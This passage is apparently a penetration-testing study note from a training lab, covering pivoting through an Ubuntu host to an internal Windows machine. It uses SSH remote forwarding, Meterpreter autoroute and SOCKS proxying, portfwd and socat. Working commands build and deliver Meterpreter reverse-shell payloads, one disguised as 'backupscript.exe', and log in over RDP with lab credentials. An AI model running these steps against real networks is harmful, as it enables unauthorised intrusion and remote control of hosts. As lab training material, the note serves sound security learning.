</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
search rdp_scanner
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
search rdp_scanner
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
use 0
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
msf6 auxiliary(scanner/rdp/rdp_scanner) > run
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK

[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:10.0.17763) (Requires NLA: No)
[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

</td>
</tr>
</table>

At the bottom of the output above, we can see the RDP port open with the Windows OS version.

Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For this module, we will log in to the Windows remote host over the SOCKS tunnel. This can be done using `xfreerdp`. The user in our case is `victor`, and the password is `pass@123`

**Using rdp_scanner Module**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
ProxyChains-3.1 (http://proxychains.sf.net)
[13:02:42:481] [4829:4830] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
```

</td>
</tr>
</table>

The `xfreerdp` command will require an RDP certificate to be accepted before successfully establishing the session. After accepting it, we should have an RDP session, pivoting via the Ubuntu server.

</details>

</details>

---

<details>
<summary><h2>🔄 Remote/Reverse Port Forwarding with SSH</h2></summary>

We’ve already covered:

- **Local port forwarding (`-L`)** — SSH listens on a port on your machine and forwards connections to a service reachable from the remote host. This is used to _bring a remote service to your local host_.
- **Dynamic port forwarding (`-D`)** — SSH creates a local SOCKS proxy so you can route arbitrary connections through a pivot host and reach networks that your attack machine has no direct route to.
  Now, we will cover:
- **Remote forwarding (`-R`)** — remote port → local service (expose local to remote).

Sometimes you need to expose a service running on your local machine to the remote network. This is the inverse of local forwarding: you make the remote (pivot) host listen on a port and forward incoming connections back to a service on your machine.

```mermaid
flowchart LR
  %% Nodes principales
  ATT["<b>Attack Host</b><br/><br/>10.10.15.5<br/><br/>💻<br/><br/>"]

  VIC1["<b>Victim Server (Ubuntu)</b><br/><br/>10.129.15.50<br/>172.16.5.129<br/><br/>🗄️"]

  QUESTION["<br/>❓<br/><br/><b>No route to<br/>attack host</b><br/><br/>"]

  VIC2["<b>Victim Server (Windows A)</b><br/><br/>172.16.5.19<br/><br/><b>RDP Service</b><br/><br/>🗄️"]

  %% Connections
  ATT ==>|"<b>SSH: 0.0.0.0:22</b>"| VIC1
  VIC1 ==>|" "| QUESTION
  QUESTION ==>|" "| VIC2
  VIC2 -.->|" "| ATT

  %% Styling
  style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
  style VIC1 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
  style VIC2 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
  style QUESTION fill:#2d3e50,stroke:#ff6b6b,stroke-width:3px,color:#fff

  linkStyle 0 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
  linkStyle 1 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
  linkStyle 2 stroke:#9ACD32,stroke-width:4px,stroke-dasharray:5
  linkStyle 3 stroke:#9ACD32,stroke-width:4px,stroke-dasharray:5
```



<details>
<summary><h3>Scenario</h3></summary>

**Reverse shell blocked by routing**

You try to get a reverse shell from Windows A (172.16.5.19) back to your attack host (10.10.15.5 / 10.129.x.x), but the connection fails.
**Reason:** Windows A can only route outbound traffic inside 172.16.5.0/23. It has no route to the network where your attack host lives, so a direct reverse connection cannot reach your listener.

**Why RDP alone may be insufficient**

- RDP gives interactive access but can be limited (clipboard/file transfer disabled, restricted built-in tools).
- Tasks that need deeper interaction or privileged tooling (file upload/download, process injection, API calls, Meterpreter features) often require a proper reverse shell or agent.
- Without network routing between Windows A and your attack host, a reverse shell cannot be established directly.

**Pivot concept (high-level solution)**

Use a pivot host that has connectivity to both networks. In this scenario the Ubuntu server is that pivot: it can reach both the Windows target (172.16.5.19) and the network where your attack host/listener is reachable.

- Configure the payload on Windows so its reverse connection targets the pivot host IP (the pivot acts as the rendezvous point).
- On the pivot host, forward a remote port to your attack host’s listener so that reverse traffic arriving at the pivot is relayed to your Metasploit listener.

**Concrete example**

1. Windows A outbound is restricted to 172.16.5.0/23.
2. Pivot host IP on that internal net: `172.16.5.129` (Ubuntu).
3. Configure the Meterpreter HTTPS payload to connect to **LHOST** = `172.16.5.129`.
4. On the pivot, forward port 8080 to your attack host’s Metasploit listener on port `8000`.
   - **Result:** Windows A connects to 172.16.5.129:8080 → pivot forwards to your attack host `:8000` → Metasploit accepts the session.

**When to use this approach**

- Reverse shells must traverse disjoint networks with no direct route.
- RDP is insufficient for the actions you need (file transfer, API-level enumeration, payload execution).
- You have a compromised/accessible host that can act as a reliable pivot between networks.

</details>

<details>
<summary><h3>Steps</h3></summary>

**1. Creating a Windows Payload with msfvenom**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

</td>
</tr>
</table>

**2. Configuring & Starting the multi/handler**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

</td>
</tr>
</table>

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.

**3. Transferring Payload to Pivot Host**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
scp backupscript.exe ubuntu@10.129.15.50:~/
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
backupscript.exe                                   100% 7168    65.4KB/s   00:00
```

</td>
</tr>
</table>

After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.

**4. Starting Python3 Webserver on Pivot Host**

<table width="100%">
<tr>
<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
</tr>
<tr>
<td width="20%">

**`ubuntu@pivot:~$`**

</td>
<td>

```bash
python3 -m http.server 8123
```

</td>
</tr>
</table>

**5. Downloading Payload on the Windows Target**

We can download this backupscript.exe on the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows Target</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\>`**

</td>
<td>

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

</td>
</tr>
</table>

Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000.

**6. Using SSH -R**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN
```

</td>
</tr>
</table>

After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.

**7. Viewing the Logs from the Pivot**

<table width="100%">
<tr>
<td> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td>

```
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

</td>
</tr>
</table>

If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.

**8. Meterpreter Session Established**

<table width="100%">
<tr>
<td> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td>

```
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter >
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
shell
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

</td>
</tr>
</table>

Our Meterpreter session should list that our incoming connection is from a local host itself (127.0.0.1) since we are receiving the connection over the local SSH socket, which created an outbound connection to the Ubuntu server. Issuing the netstat command can show us that the incoming connection is from the SSH service.

The below graphical representation provides an alternative way to understand this technique.

```mermaid
flowchart LR
  %% Attack Host
  ATT["<b>Attack Host</b><br/><br/>10.10.15.5<br/><br/>💻<br/><br/><b>MSFConsole: 8000</b>"]

  %% SSH Connection Info
  SSH["<b>SSH 0.0.0.0:22</b><br/><br/><b>Listens on port 8080,</b><br/><b>Forwards 8080</b><br/><b>to SSH</b>"]

  %% Victim Server Ubuntu
  VIC1["<b>Victim Server (Ubuntu)</b><br/><br/>10.129.15.50<br/>172.16.5.129<br/><br/>🗄️"]

  %% Victim Server Windows A
  VIC2["<b>Victim Server (Windows A)</b><br/><br/>172.16.5.19<br/><br/><b>RDP Service</b><br/><br/>🗄️"]

  %% Connections
  ATT ==>|"<b>Forward remote<br/>port 8080 to local<br/>port 8000</b>"| SSH
  SSH <-->|"<b>SSH Tunnel</b>"| VIC1
  VIC1 ==>|"<b>Reverse HTTPS Shell</b>"| VIC2
  VIC2 -.->|"<b>Reverse shell<br/>forwarded to port<br/>8000 (msfconsole)</b>"| ATT

  %% Styling
  style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
  style SSH fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
  style VIC1 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
  style VIC2 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff

  linkStyle 0 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
  linkStyle 1 stroke:#9ACD32,stroke-width:4px
  linkStyle 2 stroke:#ff0000,stroke-width:4px
  linkStyle 3 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
```



</details>

</details>

---

<details>
<summary><h2>🕳️ Meterpreter Tunneling & Port Forwarding</h2></summary>

In some scenarios, we may already have Meterpreter shell access on the Ubuntu server (the pivot host) and want to perform enumeration scans through it while still benefiting from the conveniences that Meterpreter sessions provide. In these cases, we can create a pivot directly through the Meterpreter session without relying on SSH port forwarding.

<details>
<summary><h3>Method 1. Using a Meterpreter Session</h3></summary>

<details>
<summary><h4>1. Configuring & Starting the multi/handler</h4></summary>

We can generate a Meterpreter shell for the Ubuntu server, which will give us a shell on our attack host listening on port 8080.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f elf -o shell.elf
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No encoder specified, outputting raw payload
# Payload size: 1121480 bytes
# Final size of elf file: 1121480 bytes
# Saved as: shell.elf
```

</td>
</tr>
</table>

**Transfer the Payload to the Pivot Host**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
scp shell.elf ubuntu@10.129.202.64:/home/ubuntu/
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# ubuntu@10.129.202.64's password:
# shell.elf
```

</td>
</tr>
</table>

Before executing the payload over, we can start a Metasploit multi/handler, also known as a Generic Payload Handler.

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload linux/x64/meterpreter_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x64/meterpreter_reverse_tcp
# payload => linux/x64/meterpreter_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.14.40
# LHOST => 10.10.14.40
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 4444
# LPORT => 4444
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
# [*] Started reverse TCP handler on 10.10.14.40:4444
```

</td>
</tr>
</table>

**Execute the Payload on the Pivot Host**

<table width="100%">
<tr>
<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
</tr>
<tr>
<td width="20%">

**`ubuntu@pivot:~$`**

</td>
<td>

```bash
ubuntu@WebServer:~$ ls
# shell.elf
chmod +x shell.elf
./shell.elf
```

</td>
</tr>
</table>

**Confirm the Meterpreter Session back in the MSFCONSOLE**

<table width="100%">
<tr>
<td> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td>

```
# [*] Meterpreter session 1 opened (10.10.14.40:4444 -> 10.129.202.64:36500) at 2025-11-27 18:44:12 -0600
```

</td>
</tr>
</table>

**Check interfaces**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash

(Meterpreter 1)(/home/ubuntu) > ifconfig

# Interface  1
# ============
# Name         : lo
# Hardware MAC : 00:00:00:00:00:00
# MTU          : 65536
# Flags        : UP,LOOPBACK
# IPv4 Address : 127.0.0.1
# IPv4 Netmask : 255.0.0.0
# IPv6 Address : ::1
# IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


# Interface  2
# ============
# Name         : ens192
# Hardware MAC : 00:50:56:b0:15:2d
# MTU          : 1500
# Flags        : UP,BROADCAST,MULTICAST
# IPv4 Address : 10.129.202.64
# IPv4 Netmask : 255.255.0.0
# IPv6 Address : dead:beef::250:56ff:feb0:152d
# IPv6 Netmask : ffff:ffff:ffff:ffff::
# IPv6 Address : fe80::250:56ff:feb0:152d
# IPv6 Netmask : ffff:ffff:ffff:ffff::


# Interface  3
# ============
# Name         : ens224
# Hardware MAC : 00:50:56:b0:42:50
# MTU          : 1500
# Flags        : UP,BROADCAST,MULTICAST
# IPv4 Address : 172.16.5.129
# IPv4 Netmask : 255.255.254.0
# IPv6 Address : fe80::250:56ff:feb0:4250
# IPv6 Netmask : ffff:ffff:ffff:ffff::

(Meterpreter 1)(/home/ubuntu) > background
# [*] Backgrounding session 1...
[msf](Jobs:1 Agents:1) exploit(multi/handler) >> sessions

# Active sessions
# ===============

#   Id  Name  Type                   Information             Connection
#   --  ----  ----                   -----------             ----------
#   1         meterpreter x64/linux  ubuntu @ 10.129.202.64  10.10.14.40:4444 -> 10.129.202.64:36500 (10.129.202.64)
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>2. Automatically Adding Routes with Autoroute</h4></summary>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute
# [*] Using configured payload linux/x64/meterpreter_reverse_tcp
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
# SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run
# [*] Running module against 10.129.202.64 (10.129.202.64)
# [*] Searching for subnets to autoroute.
# [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
# [+] Route added to subnet 172.16.4.0/255.255.254.0 from host's routing table.
# [*] Post module execution completed
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run autoroute -s 172.16.5.0/23
# [*] Running module against 10.129.202.64 (10.129.202.64)
# [*] Searching for subnets to autoroute.
# [*] Did not find any new subnets to add.
# [*] Post module execution completed
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> route print

# IPv4 Active Routing Table
# =========================

#    Subnet             Netmask            Gateway
#    ------             -------            -------
#    10.129.0.0         255.255.0.0        Session 1
#    172.16.4.0         255.255.254.0      Session 1

# [*] There are currently no IPv6 routes defined.
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>3. Starting the SOCKS Proxy</h4></summary>

This allows external tools (proxychains, nmap, etc.) to pivot through Meterpreter.

**Start the SOCKS Proxy Server**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use auxiliary/server/socks_proxy
# [*] Using configured payload linux/x64/meterpreter_reverse_tcp
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVHOST 127.0.0.1
# SRVHOST => 127.0.0.1
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVPORT 1080
# SRVPORT => 1080
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> run
# [*] Auxiliary module running as background job 0.
[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >>
# [*] Starting the SOCKS proxy server

#NOTE: PRESS ENTER TO KEEP USING THE CONSOLE
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>4. Updating proxychains.conf (If Needed)</h4></summary>

Once the SOCKS server is running, we can route traffic from tools like **Nmap** through our pivot on the compromised Ubuntu host using **proxychains**. To enable this, we add the following entry to the end of the `/etc/proxychains.conf` file (if it is not already present):

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
grep -qxF "socks4 127.0.0.1 1080" /etc/proxychains.conf || echo "socks4 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>5. Scanning Internal Hosts via Meterpreter</h4></summary>

**Ping Sweep using Meterpreter**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> sessions -i 1
# [*] Starting interaction with 1...

(Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
# [*] Performing ping sweep for IP range 172.16.5.0/23

# [+] 	172.16.5.19 host found
# [+] 	172.16.5.129 host found
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>6. Port Forwarding (Pivoting RDP Through Meterpreter)</h4></summary>

**Create a Local Port Forward**

Port forwarding can be accomplished using Meterpreter's portfwd module.

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
(Meterpreter 1)(/home/ubuntu) > portfwd add -l 3389 -p 3389 -r 172.16.5.19
[*] Forward TCP relay created: (local) :3389 -> (remote) 172.16.5.19:3389
```

</td>
</tr>
</table>

The above command requests the Meterpreter session to start a listener on our attack host's locmeal port (-l) 3389 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3389, we will be able to create a remote desktop session.

**Verify Forwarding with netcat**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
nc -v 127.0.0.1 3389
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# localhost [127.0.0.1] 3389 (ms-wbt-server) open
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>7. Connecting to the Internal Windows Host via RDP</h4></summary>

**Use xfreerdp:**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
xfreerdp /v:localhost /u:victor /p:pass@123
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-1640397/.config/freerdp
# [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-1640397/.config/freerdp/certs]
# [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-1640397/.config/freerdp/server]
# [19:43:11:993] [49955:49956] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
# [19:43:11:993] [49955:49956] [WARN][com.freerdp.crypto] - CN = DC01.inlanefreight.local
# [19:43:11:994] [49955:49956] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - The hostname used for this connection (localhost:3389)
# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - Common Name (CN):
# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - 	DC01.inlanefreight.local
# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
# Certificate details for localhost:3389 (RDP-Server):
# 	Common Name: DC01.inlanefreight.local
# 	Subject:     CN = DC01.inlanefreight.local
# 	Issuer:      CN = DC01.inlanefreight.local
# 	Thumbprint:  ef:53:77:2b:04:31:f8:1a:2e:45:4a:8f:f9:9e:74:58:da:da:59:90:87:27:dc:dc:28:19:fc:65:c4:73:54:f9
# The above X.509 certificate could not be verified, possibly because you do not have
# the CA certificate in your certificate store, or the certificate has expired.
# Please look at the OpenSSL documentation on how to add a private CA to the store.
# Do you trust the above certificate? (Y/T/N) y
```

</td>
</tr>
</table>

Once accepted, you will gain full RDP access to the internal host.

</details>

</details>

<details>
<summary><h3>Method 2. Using SOCKS proxy to pivot</h3></summary>

</details>

</details>

</details>

---

<details>
<summary><h1>🏓 Playing Pong with Socat</h1></summary>

<details>
<summary><h2>Socat redirection with a Reverse Shell</h2></summary>

Socat is a bidirectional relay tool that creates pipe sockets between two independent network channels without using SSH tunneling. It functions as a redirector that listens on one host and port and forwards data to another IP address and port.

```mermaid
flowchart LR
    %% Nodes
    A["<b>🔴 Attack Host</b><br/>10.10.14.18"]
    MH["<b>Metasploit Handler</b><br/>Listen: 80"]
    S["<b>Socat Redirector</b><br/>Listen: 8080<br/>Forward 10.10.14.18:80"]
    U["<b>🖥️ Ubuntu Server</b><br/>10.129.202.64<br/>172.16.5.129"]
    V["<b>🖥️ Windows Victim</b><br/>172.16.5.19<br/>User: INLANEFREIGHT\victor"]
    P["<b>📦 Payload</b><br/>backupscript.exe<br/>LHOST=172.16.5.129:8080"]

    %% Connections
    MH ---|"<b>Running on</b>"| A
    S ---|"<b>Running on</b>"| U
    P ---|"<b>Executed on</b>"| V
    V -.->|"<b>1.</b> Reverse Connection"| S
    S -.->|"<b>2.</b> Forwards to"| MH
    MH ==>|"<b>3.</b> Meterpreter Session<br/>Established"| A

    %% Styling
    style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
    style MH fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
    style S fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
    style U fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style V fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style P fill:#8b6a3a,stroke:#ff9500,stroke-width:3px,color:#fff

    %% Link styling
    linkStyle 0 stroke:#9b87f5,stroke-width:2px
    linkStyle 1 stroke:#6c8ebf,stroke-width:2px
    linkStyle 2 stroke:#ff9500,stroke-width:2px
    linkStyle 3 stroke:#90EE90,stroke-width:3px,stroke-dasharray:5
    linkStyle 4 stroke:#6c8ebf,stroke-width:3px,stroke-dasharray:5
    linkStyle 5 stroke:#ff6b6b,stroke-width:4px
```



Metasploit's listener can be started on the attack host using the following command.

<table width="100%">
<tr>
<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
</tr>
<tr>
<td width="20%">

**`ubuntu@pivot:~$`**

</td>
<td>

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

</td>
</tr>
</table>

Socat listens on localhost:8080 and forwards all traffic to port 80 on the attack host (10.10.14.18). After configuring the redirector, a payload can be created to connect back to the redirector running on the Ubuntu server.

A listener must also be started on the attack host because any connection received by socat from a target will be redirected to the attack host's listener, where a shell will be obtained.

**Creating the Windows Payload**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No encoder specified, outputting raw payload
# Payload size: 743 bytes
# Final size of exe file: 7168 bytes
# Saved as: backupscript.exe
```

</td>
</tr>
</table>

Now, we must transfer this payload to the Windows host.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

